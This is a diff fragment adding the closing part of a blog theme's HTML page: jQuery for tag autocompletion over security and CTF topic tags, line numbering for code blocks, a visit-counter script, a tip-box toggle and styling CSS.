+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#php','#命令执行','#比赛回顾','#WP','#弱类型','#RSA','#ssrf','#mysql load data','#LSB','#MISC','#隐写','#工具','#渗透测试','#redis','#Xdebuf','#ctf','#SQL','#docker','#serialize','#哈希长度扩展攻击','#zip','#misc',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kej6ap1bj31hc0u0wn6.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
